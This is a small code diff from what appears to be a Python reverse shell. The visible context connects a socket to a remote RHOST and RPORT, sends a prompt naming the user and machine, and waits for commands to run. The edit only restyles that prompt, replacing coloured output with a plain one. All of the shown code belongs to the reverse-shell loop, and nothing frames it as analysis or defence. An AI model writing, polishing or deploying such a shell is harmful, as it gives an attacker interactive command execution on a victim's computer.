@@ -31,7 +31,7 @@ sock.connect((RHOST, RPORT))
 
 while True:
     try:
-        header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
+        header = f"""({getpass.getuser()}@{platform.node()})> """
         sock.send(header.encode())
         STDOUT, STDERR = None, None
         cmd = sock.recv(1024).decode("utf-8")
